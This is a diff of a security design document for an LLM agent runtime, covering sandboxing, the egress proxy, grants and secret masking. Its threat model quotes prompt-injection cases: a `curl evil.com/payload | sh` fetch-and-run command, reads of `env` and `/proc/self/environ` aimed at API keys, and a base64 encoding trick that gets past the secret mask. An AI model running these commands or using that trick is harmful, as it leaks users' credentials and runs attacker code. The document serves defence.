@@ -12,13 +12,14 @@
 │  TRUSTED (config-constrained)                           │
 │  Same binary, same process — runs the agent loop, tool  │
 │  dispatch, and session state machine.                   │
-│  Constrained by: setrlimit, egress proxy, config values │
+│  Constrained by: grants, approvals, config values       │
 ├─────────────────────────────────────────────────────────┤
 │  UNTRUSTED                                              │
 │  --run-tool broker children (re-exec'd) — execute       │
 │  LLM-directed shell/web/js/file tool calls              │
-│  Sandboxed by: namespaces, proxy, env stripping         │
-│  Cannot: reach arbitrary hosts, read secrets, escape fs │
+│  Contained by: backend (namespaces), proxy, clean env   │
+│  Cannot: reach ungranted hosts, read key/DB, see paths  │
+│  outside workspace + grants (all void under `host`)     │
 └─────────────────────────────────────────────────────────┘
 ```
 
@@ -27,7 +28,7 @@
 | Main process (CLI/daemon) | Full | Your binary, root of trust, holds encryption key |
 | Agent loop (same process) | High (self-constrained) | Your binary, but executes LLM-directed logic; respects DB + env config |
 | LLM output | Untrusted input | Adversarial by assumption (prompt injection, jailbreaks) |
-| --run-tool broker children | Untrusted | Re-exec'd for each tool call; kernel-sandboxed (shell/web/js/file tiers) |
+| --run-tool broker children | Untrusted | Re-exec'd for each tool call; contained by the backend (shell/web/js/file tiers), except under `host` |
 | JS runtime (in broker child) | Untrusted | Executes LLM-generated code; heap-capped, instruction-limited |
 | External HTTP responses | Untrusted | Wrapped in boundary markers, homoglyph-sanitized |
 
@@ -35,17 +36,17 @@
 
 The agent process is **your compiled code** — not a container running arbitrary payloads. The security model relies on the agent binary correctly implementing:
 
-1. **Config loading** — reads config from cclaw.db (main process) or `CCLAW_*` env vars (re-exec'd children), builds internal policy structs
-2. **Egress enforcement** — all sandboxed tool children (shell, web, js) run inside a network namespace; outbound connections are forced through the credential proxy where `host_decide()` (`src/proxy.c`) checks each hop against the agent's allowed-hosts rules — including redirects
-3. **Tool dispatch** — workspace path validation, shell timeout, iteration limits
-4. **Secret handling** — holds decrypted API key in memory, never logs it, never passes to shell children
+1. **Config loading** — the main process reads cclaw.db with `CCLAW_*` env overrides. `--run-tool` children load no config (see below).
+2. **Egress decision** — the network tool children (shell, web, js) run inside a network namespace whose only route out is the credential proxy. `host_decide()` (`src/proxy.c`) checks each hop against the call's host rules, redirects included.
+3. **Tool dispatch** — grant, approval and sensitivity gates, tool timeouts, iteration limits. Path policy is not checked in dispatch: the mount namespace enforces it (portability.md, "As built").
+4. **Secret handling** — holds decrypted provider API keys in memory, never logs them, never passes them to tool children.
 
 ### What Could Go Wrong
 
 | Failure mode | Impact | Mitigation |
 |--------------|--------|-----------|
 | Bug in policy enforcement | Agent reaches blocked host | Code review; integration tests |
-| Agent ignores config limit | Infinite loop, resource exhaustion | `setrlimit` is kernel-enforced (can't be bypassed from userspace) |
+| Agent ignores config limit | Infinite loop, resource exhaustion | `max_iterations` and turn caps in the loop; tool children get kernel-enforced `setrlimit` caps per profile |
 | Memory corruption | Arbitrary behavior | `-Wall -Wextra -Werror`, ASAN in dev, arena allocator limits scope |
 | Agent leaks secret to LLM context | Key visible in session history | Never include provider-native env var (e.g. `OPENROUTER_API_KEY`) in any message/tool_result; grep for leaks in tests |
 | Agent writes to wrong DB | Cross-agent data corruption | Agent only opens `CCLAW_DB_PATH` path; writes scoped by agent_name |
@@ -55,8 +56,9 @@ The agent process is **your compiled code** — not a container running arbitrar
 - Single user — no multi-tenant isolation requirement
 - Binary is compiled from audited source — not downloaded/executed dynamically
 - Long-lived process with per-tool isolation — untrusted work runs in short-lived `--run-tool` broker children (re-exec'd, namespace-sandboxed), not in the parent
-- `setrlimit` provides hard kernel caps regardless of bugs
-- Namespace sandbox for tool children provides filesystem isolation even if code has path-traversal bugs
+- `setrlimit` gives tool children hard kernel caps regardless of bugs
+- The namespace sandbox gives tool children filesystem isolation even if cclaw's code has path-traversal bugs
+- None of the last two applies under `host`; that profile is the operator's explicit choice ([portability.md](portability.md#boundaries-by-what-the-host-offers))
 
 ## Config Loading
 
@@ -65,10 +67,9 @@ The main process (CLI or daemon) loads config via `config_load(db)` (`src/config
 ### Principles
 
 1. **One loader** — the main process reads DB + env overrides into a `Config` struct, immutable after load. Tool children get pre-validated parameters, not a config.
-2. **Parse once, validate early** — `config_load(db)` runs at main-process startup, validates all values, fails fast on malformed input.
+2. **Parse once** — `config_load(db)` runs at main-process startup.
 3. **Immutable after load** — config struct is read-only for process lifetime; no runtime config reload
-4. **Fail closed** — missing required var (e.g. `CCLAW_DB_PATH`) → process exits immediately
-5. **Minimal surface** — tool children receive only what they need; daemon internals stay in the parent
+4. **Minimal surface** — tool children receive only what they need; daemon internals stay in the parent
 
 ### DB path resolution
 
@@ -78,55 +79,13 @@ The main process (CLI or daemon) loads config via `config_load(db)` (`src/config
 
 | Var | Sensitivity | Notes |
 |-----|-------------|-------|
-| `CCLAW_AGENT_NAME` | Low | Identity string |
 | `CCLAW_DB_PATH` | Low | Path to cclaw.db (overrides default `~/.cclaw/cclaw.db`) |
 | `CCLAW_WORKSPACE` | Low | Path |
 | `CCLAW_MODEL` | Low | Model name string |
 | `CCLAW_MAX_ITERATIONS` | Low | Integer cap |
-| `CCLAW_TOOLS` | Medium | Tool whitelist — controls agent capabilities |
 | `CCLAW_SHELL_TIMEOUT` | Low | Integer |
-| provider-native env var (e.g. `OPENROUTER_API_KEY`) | **High** | Decrypted secret — cleared from env after read |
+| provider-native env var (e.g. `OPENROUTER_API_KEY`) | **High** | Read at startup. Never reaches a tool child: the `--run-tool` child starts from an empty environment |
 | `CCLAW_TOKEN_RATE_LIMIT` | Low | Integer |
-
-### Best Practices for Tool-Child Config
-
-1. **Clear secrets from env immediately after reading**
-   ```c
-   const char *key = getenv(cfg->provider.api_key_env);
-   char *api_key = strdup(key);  // copy to heap
-   unsetenv(cfg->provider.api_key_env);  // remove from environ
-   ```
-   Why: `shell_exec` children inherit env. Sandbox setup already strips CCLAW_*/API-key vars before exec (src/sandbox.c), but defense-in-depth says don't keep secrets in env longer than necessary.
-
-2. **Validate allowed_hosts before use**
-   ```c
-   // Reject private IPs in allowed_hosts (daemon should have caught this, but verify)
-   for (int i = 0; i < policy.allowed_count; i++)
-       if (is_private_ip(policy.allowed[i])) abort();
-   ```
-
-3. **Treat CCLAW_TOOLS as a whitelist, not a suggestion**
-   - If tool not in list → don't register it
-   - Empty list = no tools (not "all tools")
-   - Unknown tool name → skip silently (forward compat)
-
-4. **Don't expose config values to LLM**
-   - System prompt should not contain `allowed_hosts` list (tells attacker what's reachable)
-   - Don't include workspace path in error messages sent to LLM
-   - Tool errors: generic "permission denied", not internal details
-
-5. **Log config at startup (debug level), never log secrets**
-   ```c
-   fprintf(stderr, "[agent] name=%s model=%s tools=%s hosts=%s\n",
-           name, model, tools_csv, hosts_csv);
-   // Never: fprintf(stderr, "api_key=%s\n", api_key);
-   ```
-
-6. **Daemon validates before injection**
-   - `allowed_hosts` entries must be valid hostnames (no paths, no wildcards except `*.domain`)
-   - `max_iterations` must be positive integer ≤ 200
-   - `workspace` must be under `.cclaw/agents/` (prevent path traversal)
-   - `tools` must be subset of known tool names
 
 ## Defense-in-Depth Layers
 
@@ -134,26 +93,27 @@ Ordered from most to least critical:
 
 | # | Layer | Scope | Kernel-enforced? | Bypassable by agent? |
 |---|-------|-------|------------------|---------------------|
-| 1 | `setrlimit` | Agent + children | Yes | No |
-| 2 | Namespace sandbox | Shell/qjs children | Yes | No (separate process) |
-| 3 | Credential proxy (`proxy.c` `decide()`) | Shell/web/js children network | Yes (netns) | No (separate netns) |
-| 4 | Env stripping | Shell children | No (app-level) | Only via code bug |
+| 1 | `setrlimit` | Tool children (per profile) | Yes | No |
+| 2 | Containment backend (namespace sandbox) | All `--run-tool` children | Yes | No (separate process) |
+| 3 | Credential proxy (`proxy.c` `host_decide()`) | Shell/web/js children network | Yes (netns has no other route) | No (separate netns) |
+| 4 | Clean environment | Tool children | No (app-level) | Only via code bug |
 | 5 | `prctl(PR_SET_PDEATHSIG)` | Orphan cleanup | Yes | No |
 
 Layers 1–3 are hard boundaries (kernel-enforced, separate address space).
 Layer 4 is a soft boundary (correct code required).
-Layer 5 is bonus hardening (unavailable on some targets).
+Layer 5 is bonus hardening (Linux-specific).
 
-(The former layer 4 here was `http_check_policy()` — a pre-flight URL check
-for `web_fetch`. It's been removed: `web_fetch`/`js_eval` now run inside the
-same sandboxed-proxy model as `shell_exec`, so egress for all three tools is
-decided by layer 3's `decide()` on every hop, including redirects, which a
-single pre-flight check could never see. See `shell-networking.md` and
-`egress-filter.md` §8.)
+Under `host`, layers 1–3 are absent and layer 4 is a blacklist scrub
+([sandbox-profiles.md](sandbox-profiles.md)). These layers are the
+containment layer (layer 3) of [portability.md](portability.md#the-layers).
+
+Egress for all three network tools is decided by `host_decide()` on every
+hop, redirects included. No pre-flight URL check exists
+([shell-networking.md](shell-networking.md), [egress-filter.md](egress-filter.md)).
 
 **Prefer running cclaw as an unprivileged user.** The namespace sandbox
 identity-maps the invoking uid into the child's user namespace (uid_map
-`<uid> <uid> 1`, `sandbox.c`) — the payload runs as the real user, not as
+`<uid> <uid> 1`, `contain_linux.c`) — the payload runs as the real user, not as
 ns-root, so `whoami` tells the truth and privileged-looking behavior
 (`apt`, `sudo`, low ports, in-ns mounts) fails honestly rather than
 half-working under a fake root. When the invoking uid is 0 the payload *is*
@@ -250,7 +210,7 @@ The grants system is the runtime authorization layer. It determines what an agen
 
 ### Dispatch gate order
 
-When a tool call arrives from the model, dispatch (`src/main.c:369`) evaluates these gates in order. Each gate is restrict-only: it can escalate from ALLOW→ASK→DENY, never relax.
+When a tool call arrives from the model, `dispatch_tool()` (`src/dispatch.c`) evaluates these gates in order. Each gate is restrict-only: it can escalate from ALLOW→ASK→DENY, never relax.
 
 1. **Grant check** — `grants_contains(db, agent, "tool", name)`. No live grant row → hard deny with "not granted — request it with request_config".
 2. **Session tool_filter** — `session_tool_allowed()`. Grants ∩ filter (positive list frozen at session spawn); blocks filtered tools.
@@ -270,7 +230,7 @@ Beyond the gate, both rules have a proxy-level enforcement half (the load-bearin
 
 ### Where a call's host allowlist comes from
 
-`call_egress_build()` (`src/main.c`) assembles the `host_rules` of every
+`call_egress_build()` (`src/dispatch.c`) assembles the `host_rules` of every
 network-tier `RunToolReq`, in this order:
 
 1. **Base list** — the tool's manifest-**declared** hosts if it is a *promoted*
@@ -290,7 +250,7 @@ kernel-enforced and beats every declaration.
 
 ### grants.approval_mode
 
-Each grant row carries an `approval_mode` column (`'silent'` | `'always'` | `'tool_decides'`), read by `agent_tool_mode()` (`src/agent_config.c:329`). This controls whether a granted tool runs freely or requires per-call human confirmation:
+Each grant row carries an `approval_mode` column (`'silent'` | `'always'` | `'tool_decides'`), read by `agent_tool_mode()` (`src/agent_config.c`). This controls whether a granted tool runs freely or requires per-call human confirmation:
 
 | Mode | Behavior |
 |------|----------|
@@ -302,7 +262,7 @@ Set via `agent_config_set_tool_mode()` or the `--auto-approve` path.
 
 ### grants.expires_at (self-expiring grants)
 
-Grant rows may carry an `expires_at` unix timestamp. `grants_json()` (`src/agent_config.c:438`) filters expired rows with `expires_at IS NULL OR expires_at > unixepoch()`, so they silently vanish without manual cleanup. Used by `--auto-approve` to issue time-bounded ambient grants.
+Grant rows may carry an `expires_at` unix timestamp. `grants_json()` (`src/agent_config.c`) filters expired rows with `expires_at IS NULL OR expires_at > unixepoch()`, so they silently vanish without manual cleanup. Used by `--auto-approve` to issue time-bounded ambient grants.
 
 ### request_config tool
 
@@ -338,11 +298,11 @@ All actions use `resolve='apply'` approvals (ambient capability grants, not one-
 
 ### read_path / write_path grants → sandbox bind-mounts
 
-Path grants (`kind='read_path'` or `kind='write_path'`) become extra bind-mounts inside the sandboxed tool child. `agent_setup_init()` (`src/agent_setup.c:56`) loads them into the `SandboxProfile`, and `sandbox.c:282` mounts them (canonicalized, deduped, rw-wins, sorted shallow→deep) alongside the workspace.
+Path grants (`kind='read_path'` or `kind='write_path'`) become extra bind-mounts inside the sandboxed tool child. `agent_setup_init()` (`src/agent_setup.c`) loads them into the `SandboxProfile`, and `contain_enter()` (`src/contain_linux.c`) mounts them (canonicalized, deduped, rw-wins, sorted shallow→deep) alongside the workspace.
 
 ### --auto-approve (CLI)
 
-`--auto-approve` (`src/main.c:1446`) answers approval parks without prompting:
+`--auto-approve` (`src/resolve.c`) answers approval parks without prompting:
 
 - **rerun** approvals → resolved as ONCE (single use, no durable state)
 - **apply** approvals → resolved as ALWAYS with a self-expiring grant (`expires_at = now + approval_timeout_sec`), so ambient capabilities auto-revoke after the timeout
@@ -360,37 +320,35 @@ When stdin is not a tty (`-p` piped mode), approvals are auto-denied (`APPROVAL_
 LLM is tricked into calling `shell_exec("curl evil.com/payload | sh")`.
 
 Mitigations:
-- Shell child in network namespace → all TCP redirected to proxy
-- Proxy checks `evil.com` against `allowed_hosts` → denied
-- Even if proxy bypassed: filesystem is read-only (namespace remount)
-- Even if file written: workspace only, no execute permission on workspace mount
+- The shell child runs in a network namespace. The only route out is the proxy, reached through the proxy variables; a program that ignores them has no network.
+- The proxy checks `evil.com` against the call's host rules → denied (403).
+- System directories are mounted read-only. A written file lands only in the workspace, `/tmp` scratch, or a `write_path` grant.
 
 ### Prompt injection → secret exfiltration
 
 LLM tries to read API key via `shell_exec("env")` or `file_read("/proc/self/environ")`.
 
 Mitigations:
-- All CCLAW_* and API key vars unset before shell exec
-- `file_read` restricted to workspace
-- `/proc/self/environ` blocked by namespace (/ is read-only, /proc remounted minimal)
-- Agent clears provider-native env var (e.g. `OPENROUTER_API_KEY`) from own env after startup read
+- Tool children start from a clean environment. A shell child gets only the `CCLAW_SECRET_*` values its command references.
+- Provider API keys never reach a tool child.
+- `file_read` sees only the workspace and granted paths (mount namespace).
+- The file tier has no `/proc`. The shell tier's `/proc` is a fresh mount for its own PID namespace, so `/proc/self/environ` shows only the child's own clean environment.
 
-### Agent code bug → writes wrong DB
+### Agent code bug → touches another agent's rows
 
-Agent has path traversal in `db_open()` and opens another agent's DB.
+All agents share one cclaw.db. A query bug could read or write another agent's rows.
 
 Mitigations:
-- Agent receives DB path via `CCLAW_DB_PATH`; all data scoped by agent_name column
-- No cross-agent data access (agent_name enforced in queries)
+- Every agent-owned table is scoped by `agent_name`, and queries filter on it.
+- Tool children never open the DB; it is masked in every sandboxed profile.
 
 ### Malicious config in cclaw.db
 
-Attacker compromises cclaw.db, sets `allowed_hosts: ["evil.com"]`.
+Attacker compromises cclaw.db and inserts a host grant for `evil.com`.
 
 Mitigations:
 - cclaw.db is mode 0600, owned by daemon user
-- Agent config changes require admin approval
-- Daemon validates config sanity before fork
+- Agent config changes made through cclaw require admin approval
 - This is a "game over" scenario — if cclaw.db is compromised, attacker has full control regardless
 
 ## Single-User Assumptions
@@ -406,7 +364,7 @@ CClaw is designed for one user. This simplifies the security model:
 If CClaw ever becomes multi-user, the trust model changes fundamentally:
 - Agent processes would need hard isolation (containers, VMs)
 - Config injection would need cryptographic attestation
-- Daemon.db would need per-user access control
+- cclaw.db would need per-user access control
 - This is explicitly out of scope.
 
 ## Secret Storage
@@ -415,7 +373,7 @@ Secrets are stored encrypted using ChaCha20-Poly1305 AEAD, in one table: `secret
 
 Provider API keys resolve env → system-scope secret: `config_load()` reads the provider's `api_key_env` variable first and falls back to the encrypted `secrets` row (scope `system`) under the same name (admin `set key` and `save_secret` write there). cclaw has **no `.env` parser** — a `.env` file is user-managed dev convenience that the user's own shell sources before launching cclaw.
 
-**Key-protection ceiling.** The DB store is encrypted at rest, but the key sits on the *same disk* as the ciphertext. Whole-disk theft yields both → plaintext. So the built-in store protects against *exfiltration of `cclaw.db` alone* (a leaked backup, a mis-scoped file copy) — **not** against full-disk capture or the running host. Closing that gap means deriving the key from a user passphrase (KDF) or binding it to hardware (TPM / Secure Enclave) — which is exactly what a keychain storage provider gets for free (see [Storage providers](#storage-providers)). For a single-user box a chmod-600 key file is a reasonable default; it is not a substitute for a hardware-backed vault, and users who care should use the keychain provider.
+**Key-protection ceiling.** The DB store is encrypted at rest, but the key sits on the *same disk* as the ciphertext. Whole-disk theft yields both → plaintext. So the built-in store protects against *exfiltration of `cclaw.db` alone* (a leaked backup, a mis-scoped file copy) — **not** against full-disk capture or the running host. Closing that gap means deriving the key from a user passphrase (KDF) or binding it to hardware (TPM / Secure Enclave) — which is exactly what a keychain storage provider gets for free (see [Storage providers](#storage-providers-design--not-yet-implemented)). For a single-user box a chmod-600 key file is a reasonable default; it is not a substitute for a hardware-backed vault, and users who care should use the keychain provider.
 
 **The key file is invisible to sandboxed shell children by omission.** `.cclaw_key` lives next to `cclaw.db` (`<dir of db_path>/.cclaw_key`). That directory is *not* the workspace, and no sandboxed profile mounts anything else by default — no sandboxed profile mounts the CWD — so the key and the DB ciphertext simply never materialize in the child's mount tree. `host` establishes no namespace and is exposed by construction; that is what picking `host` means.
 
@@ -429,7 +387,7 @@ There is no escape hatch at mount time, by design. A `read_path`/`write_path` gr
 
 Regression coverage is `test/test_sandbox_key_mask.c`. The load-bearing case is the *granted* one — with no grant the key is already invisible by omission, which is why the earlier breakage (the broker setting `db_path = NULL`, leaving the mask a silent no-op in every profile) went unnoticed.
 
-The one remaining exposure is **`host`** (`--trust-host` / no-userns dev mode): it runs with *no* sandbox, so a shell child reads the host filesystem directly, key included. That is the documented price of `host` — never run untrusted-derived work at `host` on a box whose `.cclaw_key` matters. See [Sandbox Profile Policy Bundles](#sandbox-profile-policy-bundles).
+The one remaining exposure is **`host`** (per agent, or `--trust-host`; the answer on a host without a containment backend, see [portability.md](portability.md)): it runs with *no* sandbox, so a shell child reads the host filesystem directly, key included. That is the documented price of `host` — never run untrusted-derived work at `host` on a box whose `.cclaw_key` matters. See [Sandbox Profile Policy Bundles](#sandbox-profile-policy-bundles).
 
 ### All secrets are injectable
 
@@ -442,7 +400,7 @@ Which secrets the model is *told about* in the system prompt is a separate autho
 cclaw is a **secret broker**, not a password manager — but it *is* a secret store. The distinction is broker-vs-lifecycle, not store-vs-nothing:
 
 - cclaw **owns** the broker: resolve at the trust boundary, inject into tool calls, mask on the way back, scope per-agent. This is the part that must be correct — it is the DLP filter, and it runs the same regardless of where the value is stored.
-- cclaw **owns** storage only as a *provider* (see [Storage providers](#storage-providers)). The default DB store is convenience storage with a key-on-disk ceiling, not the root of trust a real vault gives you.
+- cclaw **owns** storage only as a *provider* (see [Storage providers](#storage-providers-design--not-yet-implemented)). The default DB store is convenience storage with a key-on-disk ceiling, not the root of trust a real vault gives you.
 - cclaw **does not** own lifecycle: rotation, expiry, breach alerts, secure-entry UX, autofill, or per-access audit. That belongs to the OS keychain or whatever password manager the user already runs.
 
 So "trust the agent to manage my passwords" is half-right: cclaw will *broker* them safely (the value never enters the context window), but it should not *be your vault* unless you accept the key-on-disk ceiling above. Users who care should point cclaw at a keychain provider and let the OS own key protection and lifecycle.
@@ -465,7 +423,7 @@ Three ways a secret enters the `secrets` table — every one intentional and nam
 
 Each secret has a scope: `"*"` (all agents) or a comma-separated agent name list. Daemon enforces scope at injection time — an agent only receives secrets it is scoped for. Sub-agents inherit the intersection of their own scope and the parent's (same privilege-reduction rule as tools and hosts).
 
-**Today**, secrets reach tool children via `CCLAW_SECRET_*` env vars collected by `shell_secrets_collect()` (`src/tool_shell.c:43`) at process startup, merged per-call with the DB-backed `secrets` table (see [Secret Store](#secret-store)). There is no per-agent scope enforcement yet — all secrets available to the process are available to all agents in it.
+**Today**, secrets reach tool children via `CCLAW_SECRET_*` env vars collected by `shell_secrets_collect()` (`src/tool_shell.c`) at process startup, merged per-call with the DB-backed `secrets` table (see [Secret Store](#secret-store)). There is no per-agent scope enforcement yet — all secrets available to the process are available to all agents in it.
 
 **Three orthogonal axes.** Secret access is *scope* — do not collapse it into sandbox_profile:
 
@@ -521,25 +479,23 @@ Every piece of text that crosses a trust boundary goes through a consistent thre
                               ▼
                    ┌──────────────────────────────────────┐
                    │         SECRET STORE                  │
-                   │  cclaw.db config enc + CCLAW_SECRET_* │
+                   │  secrets table + CCLAW_SECRET_* env   │
                    └──────────────────────────────────────┘
 ```
 
 ### Resolve
 
-`shell_secrets_collect()` (`src/tool_shell.c:43`) loads secrets from `CCLAW_SECRET_*` env vars at process startup into a `ShellSecret[]` array, then clears them from the environment:
-
-1. `shell_secrets_collect()` — scans `environ` for `CCLAW_SECRET_*`, copies name+value, unsets from env
+`shell_secrets_collect()` (`src/tool_shell.c`) scans `environ` for `CCLAW_SECRET_*` at process startup, copies each name and value into a `ShellSecret[]` array, and unsets the variable. On every dispatch call, `secrets_snapshot()` merges this array with a fresh read of the `secrets` table (see [Secret Store](#secret-store)).
 
 Minimum value length: 8 chars. Shorter values are skipped with a warning — they are both weak secrets and dangerous to mask (too many innocent matches in output).
 
-Values are held in process memory for the duration of the turn, then freed. They are never written to any log or DB column.
+Env-collected values live in process memory for the process lifetime. DB-loaded values live for one dispatch call. Neither is written to any log or DB column.
 
 ### Inject
 
 Before a tool handler runs, `secret_interpolate()` replaces `{{SECRET:name}}` in the tool arguments with the real value. The interpolated string is a transient local passed to the handler and freed immediately; the persisted tool-call arguments (`tc->arguments`) keep the placeholder, so context/history never holds the value.
 
-Injection is restricted to tools that actually exec with credentials (`tool_needs_interpolation()` — `shell_exec`, `web_fetch`, `js_eval`). Tools that only read files or query the DB don't need it and don't get it. The js tier has a second, child-side resolution site for placeholders the parent can't see (file bodies, runtime-built strings) — see [JS-Tier Secret Resolution](#js-tier-secret-resolution-fetch-boundary).
+Injection is restricted to tools that actually exec with credentials (`ToolRecipe.needs_interp` — `shell_exec`, `web_fetch`, `js_eval`). Tools that only read files or query the DB don't need it and don't get it. The js tier has a second, child-side resolution site for placeholders the parent can't see (file bodies, runtime-built strings) — see [JS-Tier Secret Resolution](#js-tier-secret-resolution-fetch-boundary).
 
 **Two delivery channels into a shell child** (both available; pick by quoting context):
 
@@ -555,9 +511,9 @@ Placeholder interpolation is the **primary** channel: it is robust to quoting. N
 **Why argv exposure of the in-use secret is bounded, not a hole.** A secret the command *uses* must be plaintext somewhere in that process — argv (`/proc/self/cmdline`), env (`/proc/self/environ`), or its heap. You cannot hide a value from the command that consumes it. What matters is not "can the child read it" but two containment properties, both of which hold:
 
 - **It can't get back into the model's context.** A `... ; cat /proc/self/cmdline` leak is masked by `tool_result_postprocess()` *before* the result reaches the context window — the model only ever sees `{{SECRET:NAME}}`, never the plaintext. Defeating this requires the model to *encode* the value inside the command (`| base64 | rev`) so the known-value mask misses it — the documented "accidental, not determined-adversary" limit.
-- **It can't leave to an attacker.** The shell child runs in `CLONE_NEWNET`; all egress is forced through the credential proxy's `allowed_hosts` allowlist. An encoded value still can't be POSTed anywhere off-allowlist.
+- **It can't leave to an attacker.** The shell child runs in `CLONE_NEWNET`; its only route out is the credential proxy, which applies the call's host rules (narrowed to the secret's bound hosts when the call carries a secret). An encoded value still can't be POSTed anywhere off-allowlist.
 
-The host never sees the value either (PID namespace + remounted `/proc`). For HTTP credentials specifically, the **proxy** is the only mechanism that denies the plaintext to the child entirely — it injects the auth header at the network boundary so the value never enters argv/env/heap at all (see [shell-networking.md](shell-networking.md)). That's the right tool for network tokens; interpolation remains necessary for non-network uses (a CLI password prompt, a token written to a config file).
+Other processes in the sandbox cannot read it either (PID namespace + fresh `/proc`). No built mechanism denies the plaintext to the child entirely. Proxy-side header injection would (the proxy adds the auth header at the network boundary, so the value never enters argv, env or heap), but it is not built ([shell-networking.md](shell-networking.md), Non-Goals). Interpolation stays necessary for non-network uses in any case (a CLI password prompt, a token written to a config file).
 
 ### Mask
 
@@ -579,17 +535,17 @@ Both passes run before `entry_append` (tool results) and before `inbox_insert` (
 
 ### Per-tool flow
 
-`shell_exec` is a forked tool, so its round-trip threads two forks; the value lives only in transient process memory and never on the persisted path:
+`shell_exec` interpolates in the parent and carries the value through two processes; the value lives only in transient process memory and never on the persisted path ([tool-execution-model.md](tool-execution-model.md)):
 
 ```
 tool_call args (placeholder)  ──► persisted to entries (placeholder kept)
    │
-   ▼ fork #1 (tool-exec child, trusted C)
-   │   secret_interpolate → real value in this child's heap
-   │   tool_shell_handler
-   │      ▼ fork #2 (sandbox child)  →  execl /bin/sh -c  (value in argv)
-   │      stdout/stderr ─► pipe ─► handler returns raw output
-   ▼ parent drains pipe
+   ▼ parent: secret_interpolate → resolved command in the request blob
+   │   fork + execve  cclaw --run-tool  (broker; no key, no DB)
+   │      ▼ fork (sandbox child)  →  execl /bin/sh -c  (value in argv)
+   │      stdout/stderr ─► pipe ─► broker frames the raw output
+   │   broker wipes its copy of the blob after the fork
+   ▼ parent drains fd 3
      tool_result_postprocess  ──►  deinterpolate (→ {{SECRET:name}}) + AC scan
      entry_append (masked)
 ```
@@ -598,9 +554,9 @@ All three credential tools run via the `--run-tool` broker (re-exec'd child, nam
 
 | Tool | sandbox tier | interp site | known-value token | base64/URL masked | re-referenceable |
 |------|--------------|-------------|-------------------|-------------------|------------------|
-| `shell_exec` | SBX_SHELL | broker child | `{{SECRET:name}}` | yes | yes |
-| `web_fetch` | SBX_WEB | broker child | `{{SECRET:name}}` | yes | yes |
-| `js_eval` | SBX_JS | parent (args) + fetch boundary (file bodies) | `{{SECRET:name}}` | yes | yes |
+| `shell_exec` | SBX_SHELL | parent | `{{SECRET:name}}` | yes | yes |
+| `web_fetch` | SBX_WEB | parent | `{{SECRET:name}}` | yes | yes |
+| `js_eval` | SBX_JS | parent (args) + child fetch boundary (file bodies) | `{{SECRET:name}}` | yes | yes |
 
 ### Chokepoints
 
@@ -686,38 +642,21 @@ Fail-loud, both sites: a placeholder naming no loaded secret is a hard error (pa
 
 **Binding enforcement travels with the value.** Every secret resolved into a request must be bound (`secret_hosts`) to the request's host — the same rule the daemon enforces for `web_fetch`. The parent ships each secret's bound-host list in the `--run-tool` blob (the child has no DB); an unbound secret or an unmatched host throws before anything is sent, pointing at `request_config` (`secret_bindings`). A loaded-but-unused secret constrains nothing.
 
-Writing a placeholder **into** a file (`file_write`) is always legal — a file is a document, not a resolution site; the placeholder resolves (or errors) later, when the script fetches. Shell script files are deliberately NOT covered: a `{{SECRET:x}}` inside a `.sh` file executed by `shell_exec` does not resolve — shell files use `$CCLAW_SECRET_X` env injection or the proxy's header injection instead.
+Writing a placeholder **into** a file (`file_write`) is always legal — a file is a document, not a resolution site; the placeholder resolves (or errors) later, when the script fetches. Shell script files are deliberately NOT covered: a `{{SECRET:x}}` inside a `.sh` file executed by `shell_exec` does not resolve — shell files use `$CCLAW_SECRET_X` env injection instead.
 
 ### Trust-model rationale (and a rejected design)
 
 Keeping values out of the QuickJS heap is **not a goal**. The trust model's hard boundaries are (1) values never enter the context window or DB (the mask chokepoint) and (2) values never travel to unapproved hosts (netns + proxy + bindings). The child — shell or js — is model-authored code running *with* the credential; it is trusted to see what it uses, the same way `shell_exec` holds plaintext in argv today. Parent-side interpolation of args (value in the JS source/heap) is therefore fine; the fetch-boundary resolver exists for **uniform placeholder ergonomics** (files, cron, built strings), not heap hygiene.
 
-A `SECRET("name")` opaque-handle design (native binding returning a name-only handle, C-side `crypto.hmac` primitives, a grant-gated `.reveal()`) was fully specced and **rejected** (2026-08-22): it existed to serve a heap-avoidance goal the trust model does not have, at the cost of new API surface and vendored crypto. If a signing scheme (SigV4, webhook HMAC) ever needs a raw key inside a computation, interpolate it via args — sanctioned — or extend the proxy to sign at the network boundary, which is the one mechanism that genuinely denies the child the plaintext.
+A `SECRET("name")` opaque-handle design (native binding returning a name-only handle, C-side `crypto.hmac` primitives, a grant-gated `.reveal()`) was fully specced and **rejected** (2026-08-22): it existed to serve a heap-avoidance goal the trust model does not have, at the cost of new API surface and vendored crypto. If a signing scheme (SigV4, webhook HMAC) ever needs a raw key inside a computation, interpolate it via args — sanctioned — or extend the proxy to sign at the network boundary, which would be the one mechanism that genuinely denies the child the plaintext.
 
 ## Sandbox Profile Policy Bundles
 
-The `agents.sandbox_profile` column maps to a shell sandbox profile:
+`agents.sandbox_profile` selects the containment bundle for every `--run-tool`
+tier (shell, web, js, file). The bundle table, the rationale and the
+fail-closed rule live in [sandbox-profiles.md](sandbox-profiles.md); this
+section keeps only the points that concern secrets.
 
-| Policy | host | standard (default) | restricted |
-|--------|------|-------------------|------------|
-| sandbox | none | namespace | namespace |
-| env | inherit + scrub | clean allowlist | clean allowlist |
-| network | direct (no proxy) | proxy | none |
-| CWD mount | n/a (host fs) | no | no |
-| workspace | rw (host fs) | rw | rw |
-| `$HOME` | user's real home | workspace | workspace |
-| `/tmp` | host `/tmp` | private scratch bind | private scratch bind |
-| RLIMIT_NPROC | none | 256 | 64 |
-| RLIMIT_AS | none | **none** | **none** |
-| RLIMIT_CPU | none | **none** | 120s |
-
-`standard` bounds no resources beyond a fork-bomb backstop and sees no more than
-its workspace: it mounts no CWD, so reach comes only from the workspace plus
-`read_path`/`write_path` grants. No profile sets `RLIMIT_AS` — it caps address space rather than usage, which refuses
-to start large-VA runtimes (`go`, `node`, `rustc`) without bounding anything. See
-[specs/sandbox-profiles.md](sandbox-profiles.md) for the full rationale.
-
-- `secret_agent` (future) maps to `standard` with additional restriction: only `secret_store_write` tool grant, no shell
-- Unknown values (including any legacy values like `bootstrap`) fall through to `standard` in `sandbox_policy_from_profile()` (`src/sandbox.c`)
-- Resolved once in `agent_setup_init()` via `sandbox_profile_resolve()`, stored in `SandboxProfile`
-- **`.cclaw_key` and the DB family are outside every sandboxed profile's mount set**, so no sandboxed child can read the secret key or DB ciphertext by default. A `read_path`/`write_path` grant covering the DB's directory would re-expose both; `sandbox_mask_state_files()` binds an empty read-only file over them for that case. The key is masked unconditionally; the DB only when no grant names it exactly. `host` (no sandbox) is exposed by construction. See [Secret Storage](#secret-storage).
